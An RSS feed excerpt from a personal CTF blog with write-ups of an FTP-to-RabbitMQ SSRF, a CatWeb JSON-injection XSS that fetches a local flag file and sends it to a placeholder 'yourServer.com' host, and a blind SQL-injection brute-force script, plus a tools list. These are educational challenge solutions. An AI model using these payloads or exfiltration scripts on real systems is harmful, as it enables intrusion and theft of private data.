<p>Here&rsquo;s something I learned in my internet computing class about the FTP protocol: FTP connections have two modes : &ldquo;Active&rdquo; and &ldquo;Passive&rdquo;. I&rsquo;ll give a heavily truncated explanation of the two modes (if you&rsquo;re interested in learning mroe about the FTP protocol, check out the <a href="https://tools.ietf.org/html/rfc959">RFC specifications on it</a>):</p>
<p>&ndash; In active mode, the client will specify the IP of the destination to the server. The FTP server will then send the files to the specified IP. The client establishes the communication channel, tells the server the address to send data to, and the server will then open a data channel to the address.</p>
<p>&ndash; In passive mode, the server tells the client where the files will be sent to. In this case, the client will then have to open the data channel as well to get the files. By default, applications running FTP will run on passive mode.</p>
<p>The difference in active and passive really lies in the <code>RETR</code> command in the FTP specifications: active-mode <code>RETR</code> makes the client stipulate the destination IP, and passive-mode <code>RETR</code> makes the server stipulate it.</p>
<p>So for this challenge, we can make the FTP client specify the rabbitmq server as the destination IP, and use <code>RETR</code> to make the FTP server send data to rabbitmq.</p>
<p>And since the FTP protocol for this application handles for the uploading and retrieval of profile pictures, we just need to hide our payload (which would ask the rabbitmq server to send an email with the flag.txt file in it to us) in our profile picture, specify FTP to operate on active (using <code>PORT</code> command), and use the <code>RETR</code> command to let the FTP server send our payload to the rabbitmq server!</p>
<p>Okay, I&rsquo;ve explained alot here. This is the attack plan:</p>
<ul>
<li>Craft a payload that will tell the rabbitmq email queue server to email to us, with flag.txt as the attachment. Hide it in the profile picture (make sure its a png). Upload whatever picture it is as our profile picture.</li>
</ul>
<p>Here&rsquo;s the payload I crafted (a classic SSRF):</p>
<pre><code>{&quot;to&quot;:&quot;yourEmailGoesHere@example.com&quot;,&quot;text&quot;:&quot;Hello would you like a flag&quot;,&quot;attachments&quot;:[{&quot;path&quot;:&quot;/flag.txt&quot;}]}
</code></pre><ul>
<li>Through the username field, input several FTP commands to make the FTP server send our payload to the rabbitmq server. Here, I have made a file called &ldquo;payload.txt&rdquo; that has the post request data with the payload in it:</li>
</ul>
<pre><code>PASS blah
PORT 255,255,255,255,80
STOR payload.txt
PORT 172,32,56,72,0, 15672      &lt;-----rabbitmq server and port
RETR payload.txt
</code></pre><ul>
<li>Hopefully, the rabbitmq server will send us an email!</li>
</ul>
<pre><code>PCTF{not_that_contrived_i_guess}
</code></pre><p>NOTE: Doing it this way means the FTP server was establishing a connection with the rabbitmq one. However, multiple times I tried this the TCP connection would close immediately after I send my request! I worked around this by sending in a bunch of garbage in my payload.txt file alongside the actual payload, so that at least the TCP connection would have to spend time sending all of that data(think: an unending stream of AAAAAs), and persist long enough for the reponse to be recieved.</p>
<p>This was a fun way to learn how FTP servers work and how protocols of the internet operate! I&rsquo;m upset that I didn&rsquo;t have the time to participate when it happened, but nonetheless this was a great challenge :)</p>
<p>Jam</p>]]></content>
        </item>
        
        <item>
            <title>Commonly Used Software</title>
            <link>https://jamvie.net/posts/2020/04/commonly-used-software/</link>
            <pubDate>Sun, 26 Apr 2020 01:30:30 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/04/commonly-used-software/</guid>
            <description>&lt;p&gt;I really like web-based exploits, so I focus primarily on the web challenges when my team and I participate in CTFs.&lt;/p&gt;

    &lt;img src=&#34;images/Hackerman.jpg&#34;  alt=&#34;Login&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</description>
            <content type="html"><![CDATA[<p>I really like web-based exploits, so I focus primarily on the web challenges when my team and I participate in CTFs.</p>

    <img src="images/Hackerman.jpg"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>I typically take over the web challenges while my teammates delve into other topics - sometimes I look at the pwn problems, and hopefully I&rsquo;ll include some pwn writeups here! Eventually :P Anyway, as someone who focuses on web stuff, I found myself constantly utilizing the same types of tools and software to help me with challenges. I thought I&rsquo;d share them here!</p>
<p>Web exploits are broad in topic and there definitely doesn&rsquo;t exist one tool for all sploits. However, as I got exposed to more challenges I found patterns in the problems. These patterns indicated the vulnerability that I should be taking advantage of, and therefore, what types of tools I needed to further investigate those vulnerabilities.</p>
<p>However, before I get into the list I would like to make a statement about the nature of this post. This is NOT a cheatsheet on how to hack into your friend&rsquo;s facebook. &ldquo;Hacking&rdquo; for malicious purposes is illegal and can cost you <a href="https://criminal.findlaw.com/criminal-charges/hacking-laws-and-punishments.html">jail time and hefty fines</a>.</p>
<p><strong>I will not divulge information on how to compromise the privacy of individuals without their consent.</strong>
This is a CTF and ethical hacking blog only - what this post is, is a list of tools I found useful when scoping out web challenges for various CTFs!</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p><em>These are not ordered by priority or &ldquo;most utilized&rdquo;.</em></p>
<hr>
<h2 id="curl">cURL</h2>
<p>A must! <a href="https://curl.haxx.se/">cURL</a> is short for &ldquo;Client URL&rdquo;. It&rsquo;s a simple and lightweight command-line tool to transfer data using various network protocols. I use it for basic GET and POST HTTP requests, but its so versatile it can be used for much more! In its simplest form, cURL is amazing to send data to and from a specified server.</p>
<p><a href="https://jamvie.net/posts/02confidence2020_01/">In my CONfidence 2020 write-up for the &ldquo;Cat Web&rdquo; problem</a>, I use cURL heavily to examine the response data from the server with each post request I make.</p>
<h2 id="wireshark">Wireshark</h2>
<p>I gained knowledge in <a href="https://www.wireshark.org/">Wireshark</a> back in my internet computing course days. I recieved a tutorial on the basics of how to use this software - it&rsquo;s a protocol analyzer designed to examine web traffic and capture packet data between two endpoints. This software can show and display packets on all levels of the OSI hierarchy structure - you can see your common HTTP packets, TCP, DNS, to name a common few&hellip;</p>
<p>Plenty of forensic-based problems will give you a capture of internet traffic and hide a flag in there, so wireshark is useful even beyond the web challenges I use it for!</p>
<h2 id="burpsuite">Burpsuite</h2>
<p>From <a href="https://portswigger.net/support/how-to-use-burp-suite">PortSwigger, creators of BurpSuite</a>:</p>
<blockquote>
<p>Burp Suite is an integrated platform for performing security testing of web applications. It is designed to be used by hands-on testers to support the testing process.</p>
</blockquote>
<p>Burp Suite is perfect for testing out all sorts of exploits. It has much more use in testing non-production projects by enterprisal companies, and its a powerful tool for scoping out any possible vulnerabilities of an application. The community version comes with all the basic and necessary tools a CTFer or pentester would need to gauge the security of their application - often, i use it as a proxy when I&rsquo;m trying to scope our API vulnerabilities.</p>
<p>Back in my <a href="https://jamvie.net/posts/01utctf01/">UTCTF &ldquo;Epic Admin Pwn&rdquo; writeup</a>, I mentioned using Burp Suite to scope out the SQLi attack vector and using SQLmap to further exploit it - which is a much faster way than creating your own script to utilize the attack vector that was found in it!</p>
<h2 id="postman">Postman</h2>
<p>If I need to send more complex requests that might make cURL more complex to use, <a href="https://www.postman.com/">Postman</a> is my go to software. I don&rsquo;t just use Postman to send heavier requests to a server, it&rsquo;s also great for testing out RESTful APIs if you&rsquo;re creating one for a personal project. It has a clean UI and is extremely beginner-friendly, so Postman is my go-to for literally anything requiring RESTful API testing.</p>
<h2 id="sqlmap">SQLMap</h2>
<p>SQLmap is a suite of great utilities specifically for SQL-injection based attacks. It automates the detection and exploitation of any SQL-based flaws in an application. It supports most if not all major databases (MySQL, SQLite, etc) and can do everything from simple detection to database table dumping.</p>
<hr>
<p>While this is not an exhaustive list of all the tools I use, these are definitely among the most commonly used softwares that I go to when I need to test and utilize any vulnerabilities in a given CTF challenge. I hope these prove useful to you!</p>
<p>Jam</p>
<h2 id="references">References</h2>
<p><a href="https://knowyourmeme.com/memes/hackerman">Feature Image</a></p>]]></content>
        </item>
        
        <item>
            <title>CONfidence 2020: CatWeb</title>
            <link>https://jamvie.net/posts/2020/04/confidence-2020-catweb/</link>
            <pubDate>Thu, 23 Apr 2020 00:46:19 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/04/confidence-2020-catweb/</guid>
            <description>&lt;p&gt;I participated in CONfidence CTF 2020 teasers in March of this year. I was focusing mainly on this problem, and it really helped me broaden my skills in JSON-related attacks! I have never seen many JSON injections before this, so this was welcome practise.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>I participated in CONfidence CTF 2020 teasers in March of this year. I was focusing mainly on this problem, and it really helped me broaden my skills in JSON-related attacks! I have never seen many JSON injections before this, so this was welcome practise.</p>

    <img src="https://images.pexels.com/photos/3073690/pexels-photo-3073690.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;h=650&amp;w=940"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>The link to the webpage is: <code>http://catweb.zajebistyc.tf/</code></p>

    <img src="images/CatWeb_HomePage.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>We have a basic webpage with photos of cute cats filtered by their color. The drop down menu will give us black, red, grey and white cats. At the bottom is a report button, which will take whatever input we get, send it to some server, and respond to us that our report has been&hellip;well. Reported.</p>
<p>Checking out the response content as I was clicking about the page showed me the requests for the &ldquo;kind&rdquo; (colour) of cats I chose based on the drop down menu. The request was just a small JSON string stipulating what kind I asked for, and I guess the server takes that input and returns whatever.</p>
<pre><code>curl &quot;http://catweb.zajebistyc.tf/cats?kind=grey&quot;
</code></pre><p>That got me thinking, can I ask for cats of a kind not in the drop down menu? 
Editing the request to change the kind from a colour to just absolute garbage&hellip;</p>
<pre><code>curl &quot;http://catweb.zajebistyc.tf/?kind=djfa&quot;
</code></pre>
    <img src="images/NotFound.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Aha! Our text got echoed back to us in the response. There isn&rsquo;t any input validation in the JSON request! This must be a way in.</p>
<p>To test how far I could go with it, I decided to hide an XSS in the JSON, seeing as how the URL we are taken to after any sort of response also has the JSON text in it.</p>
<p>I typed this in as the URL:</p>
<pre><code>http://catweb.zajebistyc.tf/?&quot;,&quot;status&quot;:&quot;ok&quot;,&quot;content&quot;:[&quot;\&quot;&lt;img src=deadbeef onerror=alert(document.title)&gt; &lt;/img&gt;],&quot;ignore&quot;:&quot;
</code></pre><p>If there was a JSON vulnerability here, then going to this website would load up an alert with the title of the webpage (&ldquo;my cats&rdquo;). What would happen is it would attempt to load an image from the source called &ldquo;deadbeef&rdquo;, and when it can&rsquo;t find the source, it would load as an error. If the image loaded as an error, pop up an alert with the name of the webpage.</p>

    <img src="images/XSSJsonInCatWeb.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>:) Great! There is definitely JSON injection in play here. Let&rsquo;s see what we can do with it!</p>
<p>Using curl to delve deeper into the webpage, I tried to make it list directories with the command:</p>
<pre><code>curl &quot;http://catweb.zajebistyc.tf/cats?kind=..&quot;
</code></pre>
    <img src="images/CatWebTemplates.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>I traversed through the directories, but in the templates subfolder&hellip;</p>

    <img src="images/CatWebFlagLocn.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Aha! The <code>flag.txt</code> file is in there. Now we just need to somehow read it from the browser. The fact that I was able to find the local files like this means something: the path of templates looks alot like <code>file:///app/templates/flag.txt</code> - Note the root path name: file. A same-origin policy here could treat all files with this starting origin as from the same place.</p>
<p>We can use this to our advantage: create an XSS attack on the <code>file://</code> path.</p>
<p>Since an XSS endpoint was found using the JSON vulnerabilities in the URL, and there exists a report function, this is all a pretty classic XSS attack from here.</p>
<p>Craft our payload script to fetch the flag.txt from <code>file://</code>. Here&rsquo;s mine called (xss.js):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">url</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://yourServer.com/6060?&#39;</span>
<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;file:///app/templates/flag.txt&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">resp</span>=&gt;<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">flag</span>=&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span><span style="color:#f92672">+</span>(<span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">flag</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;Nothing&#39;</span>)));
</code></pre></div><p>Report this url with our payload in it:</p>
<pre><code>file:///app/templates/index.html?&quot;, &quot;status&quot;: &quot;ok&quot;, &quot;content&quot;:[&quot;\u0022&gt;&lt;script src=http://yourServer.com:6060/xss.js&gt;&lt;/script&gt;&quot;],&quot;ignore&quot;:&quot;
</code></pre><p>Now we wait for our server to retrieve the flag for us once someone checks out our reported URL :)</p>
<p><code>flag:p4{can_i_haz_a_piece_of_flag_pliz?}</code></p>
<p>This was a cool challenge to do that really helped me stretch my XSS skills and teach me how to be thorough when scoping out webpages for possible XSS attacks. I quite enjoyed this challenge! Thank you to <a href="https://p4.team/">P4</a> for hosting the CONfidence 2020 teaser :)</p>
<p>Jam</p>
<h2 id="references">References</h2>
<p>feature image credit: <a href="https://www.pexels.com/@peng-louis-587527">Peng Louis</a> on Pexels</p>]]></content>
        </item>
        
        <item>
            <title>utctf 2020: Epic Admin Pwn</title>
            <link>https://jamvie.net/posts/2020/04/utctf-2020-epic-admin-pwn/</link>
            <pubDate>Wed, 22 Apr 2020 00:46:19 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/04/utctf-2020-epic-admin-pwn/</guid>
            <description>I particpated in UTCTF with my team in March 2020, held and operated by the University of Texas ISSS. My team and I solved a very fun SQLi-based attack! This challenge helped me to refine my python skills cause the lord knows I needed it, as well as reinforced my knowledge about SQL-based attacks. This is the first web challenge I solved in the CTF, and admittedly the one that I enjoyed the most to do.</description>
            <content type="html"><![CDATA[<p>I particpated in UTCTF with my team in March 2020, held and operated by the University of Texas <a href="https://www.isss.io/">ISSS</a>. My team and I solved a very fun SQLi-based attack! This challenge helped me to refine my python skills cause the lord knows I needed it, as well as reinforced my knowledge about SQL-based attacks. This is the first web challenge I solved in the CTF, and admittedly the one that I enjoyed the most to do.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>We are presented with a clean and minimal login page. The challenge&rsquo;s description says that &ldquo;the password is the flag&rdquo;. Well, since this is only a login page, I&rsquo;d figure to try and get into admin somehow.</p>

    <img src="/images/UTCTFscreenshot1.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Initial attempts to do some scoping for SQL vulnerabilities didn&rsquo;t do anything. Inputting a single quote ' mark wouldn&rsquo;t show anything useful. So, I went in kinda blind, and did a pretty standard SQL attack: <code>admin--</code> If there were vulnerable SQL queries to be had, my input would malform the query to only return the entries where the username == admin.
And it worked!</p>

    <img src="/images/UTCTFscreenshot2.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>It&rsquo;s a static welcome page, so I didn&rsquo;t get anything useful past learning that the admin&rsquo;s username was, in fact, admin. And the challenge&rsquo;s description told me as such - if I wanted the password, I needed to do something else.</p>
<p>The fact that I got into admin meant that I malformed the SQL query so that it would ignore any sort of password checking. But, I kinda need some form of password validation in order to get any headstart on what it was. Luckily, SQL utilizes alot of logic-based keywords that lets us essentially guess the password with custom SQL we inject into it. We would want to inject rogue SQL so that the underlying query would look like,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL">
<span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39; AND pass LIKE (&#39;</span>J<span style="color:#f92672">%</span><span style="color:#e6db74">&#39;)
</span><span style="color:#e6db74">
</span></code></pre></div><p>This will return true if the admin&rsquo;s password starts with a J.</p>
<p>While I use the SQL &lsquo;LIKE&rsquo; keyword here, another keyword called &ldquo;substr&rdquo; or &ldquo;substring&rdquo; exists that I prefer. [From SQL Server Tutorial:] (<a href="https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-substring-function/">https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-substring-function/</a>)</p>
<blockquote>
<p>The SUBSTRING() extracts a substring with a specified length starting from a location in an input string.</p>
</blockquote>
<p>A teammate of mine actually created a script that bruteforced the alphanumerics letter by letter until we printed the password, but I decided to take a shot at creating one myself using python <del>because its about time I actually learn practical python for myself</del>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz1234567890{}&#39;</span>

<span style="color:#75715e"># url here would&#39;ve been the epic admin pwn site</span>
url <span style="color:#f92672">=</span> example<span style="color:#f92672">.</span>com

<span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">40</span>):
    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> chars: 
        req <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#39; AND SUBSTR(flag, {index}, 1) = &#39;{char}&#39;--&#34;</span> 
        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: req, <span style="color:#e6db74">&#34;pass&#34;</span>: <span style="color:#e6db74">&#34;JamVieSaysHello&#34;</span>} 
        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data)
        <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>equals(<span style="color:#e6db74">&#39;Welcome, admin!&#39;</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>: 
            flag <span style="color:#f92672">+=</span> char 
            <span style="color:#66d9ef">print</span>(flag) 
            <span style="color:#66d9ef">continue</span> 
</code></pre></div><p>The &ldquo;req&rdquo; var here is our custom SQL. The idea here is to test out every character against the password&rsquo;s character at the given index. If they match, store it into our buffer array. When we reach the nullbyte character which terminates strings, then we print out the buffer, which should have correctly found the password!</p>
<pre><code>utflag{dual1pa1sp3rf3ct}
</code></pre><p>Note that, we could technically put anything we wanted into the password field - our input to it never gets checked, because we override whatever checking existed for it with our custom SQL.</p>
<p>There are admittedly faster ways to do this, for example, if you have burpsuite and sqlmap you could save the post request data into a text file and have sqlmap dump the underlying database for you, which should also return the flag. However, creating the script and testing it out was alot of fun!</p>
<p>Jam</p>
]]></content>
        </item>
        
        <item>
            <title>Jamvie&#39;s first post</title>
            <link>https://jamvie.net/posts/2020/04/jamvies-first-post/</link>
            <pubDate>Mon, 20 Apr 2020 21:27:12 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/04/jamvies-first-post/</guid>
            <description>Hi, and welcome to my CTF blog. I&amp;rsquo;m just a software dev with a hobby for CTFs, and I thought a blog would be a good way to stash all my long-archived writeups for CTF challenges I participated in. I&amp;rsquo;m by no means an expert on the topic, but if someone stumbles upon here and gains a newfound interest in cybersecurity, that would be pretty cool.
Over the next few weeks I will upload my old writeups for some CTFs that occurred this year and last, so stay tuned!</description>
            <content type="html"><![CDATA[<p>Hi, and welcome to my CTF blog. I&rsquo;m just a software dev with a hobby for CTFs, and I thought a blog would be a good way to stash all my long-archived writeups for CTF challenges I participated in. I&rsquo;m by no means an expert on the topic, but if someone stumbles upon here and gains a newfound interest in cybersecurity, that would be pretty cool.</p>
<p>Over the next few weeks I will upload my old writeups for some CTFs that occurred this year and last, so stay tuned!</p>
<p>Jam
:)</p>
]]></content>
        </item>
        
    </channel>
</rss>
